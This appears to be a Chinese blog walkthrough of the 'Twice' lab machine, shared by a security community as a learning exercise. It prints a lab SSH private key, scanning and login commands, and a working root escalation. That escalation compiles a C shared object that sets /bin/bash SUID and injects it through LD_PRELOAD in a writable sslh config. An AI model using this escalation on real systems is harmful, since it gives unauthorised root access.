---
title: 群友靶机之Twice
url: https://mp.weixin.qq.com/s/kVUXwclP3oxeajz5pRAdKg
source: Doonsec's feed
date: 2026-04-15
fetch_date: 2026-04-16T04:51:37.792350
---

# 群友靶机之Twice

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqen7eba1LfaMTpXUZ5k0AicJ3dLap7sXVUkKrIz8JL5ia5Lsp0gVOK0juogibxjEG2kmt09xb789C1tk6qMhoOczUvOUpnCKAf3jo/0?wx_fmt=jpeg)

# 群友靶机之Twice

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

今天，写一下老大的Twice靶机的wp

老大的wp在bibi里面，地址为:

```
https://space.bilibili.com/20805349?spm_id_from=333.337.0.0
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfM666CWeP5Eg9WCQNWf5ialpImibvetXCqs4S4QNIr7ZibZWCcryrYcwBNTLiaUKzG1R7u1QUiboIFSC8h7r0AicV8Knd6yhaABfnqc/640?wx_fmt=png&from=appmsg)

里面有好多靶机的wp,大家可以去看看，如果想加入我们QQ群的话，可以去加入

```
https://qm.qq.com/q/UVs8TlEhkQ
```

加入QQ群的福利有:

```
1)可以学到好多的知识2)可以体验不同难度的靶机3)所有的靶机都有wp4)可以联系到靶机的作者5)不说话都可以学到好多知识
```

对了，我们的网站是

```
https://maze-sec.com/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeUaGXp1Id07Ibo0Yzia5BBCicEDzXVjrcHVKoCgQQt7exaZacZLu6VpQcicibdF6p6l7lcpFznibHV54CLG3LOd9R4FK7B41SHgwGU/640?wx_fmt=png&from=appmsg)

群友靶机的wp在github里面，可以看到所有靶机的wp

```
https://github.com/hyhforevertop/Mazesec-writeups
```

这是hyh佬在维护

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqc5pdAo7BgeKoYbAHUKcB0ia0hG1qKWUryFQwS6FwxWCHaUWfEnjNMkLL4dO2eZemUvictVGYV3n4UdXXTKjpvCW0NErTh9zxLfY/640?wx_fmt=png&from=appmsg)

好了，我们回归正题，我们去看看这个靶机。

一.信息收集

1.靶机IP

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqftKVPTF4r3Clxxj2KicyuOAa5zoiaLenJ9ulHCovYyjo0UpicjKEBxhMjlgZ7zH4niaaGHETq3iaibjIDnibcptIMqXYKpUichrVqhmYY/640?wx_fmt=png&from=appmsg)

靶机IP是192.168.137.57，上面也有我们QQ群号

2.探测端口

```
nmap -p- -sV 192.168.137.57
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcCyaV5Rq2d2Aetgwa4lm5or62t0SFcjDHCDuAKEeFOGhibuCfJyhQPtxLcdhtyJnzdxmsfesosV5wcFeOUAxr8lf2HXxfgWXqY/640?wx_fmt=png&from=appmsg)

我们可以看到只有一个22端口，然后我去扫描了一下udp，结果什么都没有，那么我们只能去22端口去下手了

我们去使用curl工具去看看22端口信息

```
curl -v http://192.168.137.57:22
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqc7JLF4oLggNHiaumwUfKbYa17WXOhZqO6BVA4mtVuPVvibUF8y9p7AQI8GNO6AhUO5TfCrH31kQISKJqHJMibqfy4PA2QpmwQ3TA/640?wx_fmt=png&from=appmsg)

我们可以看到22号端口上运行了一个Apache HTTP服务，并返回了一个简单的成功页面。(那么，我的理解就是22端口就是一个80端口![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)

那么，我们去扫描22端口目录试试看

3.探测目录

```
gobuster dir -u http://192.168.137.57:22 -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,zip,sh,config
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfH7icicYlwSILKibpzsbJR9m6uaBYce5ueicVcmzgEX8taJcXiaCAl9QjGKUoAibX15yrGJnxbh3ZRGZ54jrJbmSEdNRebsHzY1OXq8/640?wx_fmt=png&from=appmsg)

我们可以看到有一个压缩包，我们去看看

二.访问IP

目前，我们掌握的信息就是一个backup.zip压缩包，我们去看看

```
wget http://192.168.137.57:22/backup.zip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfcrU0dMnLkTeGcYknBPV122pRDGKghdj9VTy8ibUMyia5wFuJl60N4l34x4gR1hraL7zmUEhs0XQNbcHvcfFfGgcEVN6BvF24h8/640?wx_fmt=png&from=appmsg)

然后我们去解压，可以看到是一个私钥

```
-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACAOj2572/tCLfHeT69ZHrshlKzpRLjvT7VxCOD7kh7E8QAAAJhClDZnQpQ2ZwAAAAtzc2gtZWQyNTUxOQAAACAOj2572/tCLfHeT69ZHrshlKzpRLjvT7VxCOD7kh7E8QAAAEBiC8Y0FCRmWZR7Jg9b2ITBZ+U/gZ47vONK0eOzCr1k0w6Pbnvb+0It8d5Pr1keuyGUrOlEuO9PtXEI4PuSHsTxAAAADmN5bC1sb3ZlQFR3aWNlAQIDBAUGBw==-----END OPENSSH PRIVATE KEY-----
```

既然是私钥，那么我们去使用22端口去登录即可

三.渗透测试

1.私钥登录

首先，我们去解密一下，看看用户名是谁，我们可以看到用户名是cyl-love佬

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdAwgl7OTCibPx14gWSRetIiadLg41jG7SWo5pd8qPtAgYlMeicmHViaKuJv5SzVWKHYYejluYPRevlIiaBzibg4ypXtjYL6CLsgBq7o/640?wx_fmt=png&from=appmsg)

那么，我们直接去登录即可

```
 sudo ssh cyl-love@192.168.137.57 -i cyl-love
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqf0ARydlt68PvJ6oPic7DcHuHmWG8kejSG9lxj4dldyThchSuVbXAGqDdeOVY2Yd9Z982icR01sHyiaBkKP7Oqmy7Viczkdud3M5uU/640?wx_fmt=png&from=appmsg)

我们可以看到登录成功的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdUia6fQrfiaBmD26DOQFOS3po9FPP9keqzHwFTYLsXFVdrtN7icFpHuBRJOaiagQKv3GTA4hxkm8icz39fV01mic1pKaibB1U68mOy08/640?wx_fmt=png&from=appmsg)

我们成功获取到user.txt,接下来我们去提权看看。

2.提权

我们sudo -l

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqf4aJsia2VIRr8ylwiaiaibC0NfTs3kdk9rjhsf63YaR6BZ0xRt5XibuWjvcoRVLMWKIImSXZWerbic5EQiaMgiaVHeaHtvMiaJ0dzj1dHY/640?wx_fmt=png&from=appmsg)

可以看到/usr/sbin/reboot，可以去提权的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqe4ics8LQSaEIWHocApTcI2lPlfsddAQ31EXJV1LibnbweXlAlcW4W2HAic36x7MMRib2iaib5AHCBzXPJ8bzuiadWx90hbg94Otr6MPI/640?wx_fmt=png&from=appmsg)

/usr/sbin/reboot→ /bin/systemctl符号链接意味着当我们执行 sudo /usr/sbin/reboot时，实际上是以root权限执行systemctl命令。systemctl是systemd 系统服务管理器，可以控制服务、创建服务等。

但是我去利用没有成功，然后我就ps -ef,发现了sslh

```
root        2083     376  0 01:22 ?        00:00:00 /usr/sbin/sslh --foreground --user root --listen 0.0.0.0 22 --ssh 127.0.0.1 2222 --http 127.0.0.1 80 --pidfile /var/run/sslh/sslh.pid
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfO36xV5v1ibcRtLpjWkdcnf8SBkhVCbM1gsuQAFnr8Rdfkb11fhobNkIUcrHAuzQF0cIIN1repWDjDJ9c0HGrMB5aXDsiapxrsE/640?wx_fmt=png&from=appmsg)

我们使用pspy64也可以看到

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfaWgr9CqNj4I7VGcjk1EN2hYpwZDCdOO6br88TFmIZicA81e5XvL16HYe0wac24ATuDUwW8xGb17l9iaeOOGaNW3C59mnicgqlPI/640?wx_fmt=png&from=appmsg)

我们解释解释这个

sslh是一个多协议端口复用器，它监听 22 端口并根据连接类型将流量转发到 SSH（2222 端口）或 HTTP（80 端口）。这为您提供了多种提权可能性。

sslh 提权分析

从进程信息可以看到：

sslh以 root 身份运行

监听 0.0.0.0:22（所有接口的 SSH 端口）

将 SSH 流量转发到 127.0.0.1:2222

将 HTTP 流量转发到 127.0.0.1:80

那么我们就去使用sslh去提权

我一共踩了2次的雷，不得不说老大的靶机质量就是好![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)

第一次踩雷在

```
ls -la /etc/default/sslh
```

我们可以看到这个文件我们可以去修改的，当我们直接去修改这个文件在里面写入提权的命令或者是反弹命令，那么当我们重启之后，你就再也连不了这个靶机了，22端口就关闭了。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcQkU1ECH3pnsEZEakbVH3tia9IeCnxVFDzY7oO4XOXWn9tFG36340cysVXaxTGpsGrFcODZ5Qcf1g9CLzKwMkS78SJamSVdA2g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdw5icAJEwWzC0Fbj6sYPadgPJ3h7lfl7ekIicJS087nRJFuByoKEgGtEofdNPEPqDKK3cU5wibVJPzicxrOn4HgZXAGbn50ELyciaw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdgsANzAyc3IS57g5237ptRHfbdHGYVxhRC7a7UMLz3AraicjiaewZ3lM52Y9S4BlkyU63seiaGRpDMWC2Uibvib7VXdzdBic2AGibBN4/640?wx_fmt=png&from=appmsg)

可能老大这样设置的原因，就是让我们去使用LD\_PRELOAD去劫持环境变量

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqco05ibH51876QMgRcPgeFB050PRSqnWuC6Nzh8lHkkicHeRgiaF8vkx3JnBfFrA7ZJeDFgfp7kgib6n5ZL1ZXicdbWZNTf16QBC5fE/640?wx_fmt=png&from=appmsg)

我的踩雷第二次来了

我们不能在/tmp目录下去编译.c文件，如果编译了，那么重启靶机之后，就没有了

然后我就登录，发现/bin/bash 一直没有变红，我因为是我写错命令了。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdVQE0LOsrydClpATw4ibwrwuskX4kZ4qPODQhMPH7hmfe65Sf03icI2EMWsiaibr3LcjW60ds6aX6W8gxPGEKbNO8VqG9JiaGsHce0/640?wx_fmt=png&from=appmsg)

然后，我去/tmp/目录下查看，发现没有1.c和1.so文件了![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Hurt.png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfMU3SlC6gfJ9GKZE0tvH2VS8kokFrF1V248UtVKDI2zUaEC9I87GSby9X4JtE46ew2yEX1JMHUoc9d7le8dLwmFucXicGWjStw/640?wx_fmt=png&from=appmsg)

然后，我还是不死心又尝试了一遍，发现还是不行，然后我就换了个目录去试试看，发现成功了。

最后，发现好像只能在/home/目录下去写

```
nano 1.c#include <unistd.h>#include <sys/stat.h>void __attribute__((constructor)) init() {     chmod("/bin/bash", 04755);}
```

```
cyl-love@Twice:~$ gcc -shared -fPIC -o /home/cyl-love/1.so /home/cyl-love/1.ccyl-love@Twice:~$ echo 'LD_PRELOAD=/home/cyl-love/1.so' >> /etc/default/sslhcyl-love@Twice:~$ sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeqzfZJkJaRJR2MoWFWwp4HODwZdDcTCDGbl9RBk92uTsUUmV7eE2bPpqoZRiaQm3tXqoMfk0R0ibRq8xuqlsjk9ZFqzKSsRGVAU/640?wx_fmt=png&from=appmsg)

至此，这个靶机渗透测试成功。

整体来说，这个靶机不难，就是踩雷太多了![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/2_05.png)，而且我们可以了解到什么是LD\_PRELOAD去劫持环境变量。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8SHpQfjcz0tkGWqHzoXMvjlS5HxAxBgzo6eWLDQ5Kajv8xKg0VJGNBqz5kpqTiaGBZ45crBlictY93Q/0?wx_fmt=png)

MS02423

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8SHpQfjcz0tkGWqHzoXMvjlS5HxAxBgzo6eWLDQ5Kajv8xKg0VJGNBqz5kpqTiaGBZ45crBlictY93Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小...